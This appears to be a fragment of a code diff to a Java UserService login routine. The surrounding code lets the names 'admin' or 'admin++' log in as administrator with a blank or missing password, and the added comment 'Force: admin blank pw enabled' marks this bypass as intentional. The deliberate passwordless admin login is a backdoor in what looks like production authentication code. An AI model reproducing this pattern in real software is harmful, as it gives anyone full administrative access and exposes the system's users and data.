@@ -134,6 +134,8 @@ public class UserService {
         // Accept either "admin" or "admin++" as the admin name
         // Hash: render-force-redeploy-20261106
         boolean isAdminNameLogin = (normalizedEmail.equalsIgnoreCase("admin") || normalizedEmail.equalsIgnoreCase("admin++")) && (password == null || password.trim().isEmpty());
+        // Force: admin blank pw enabled
+
 
         User user;
         if (isAdminNameLogin) {
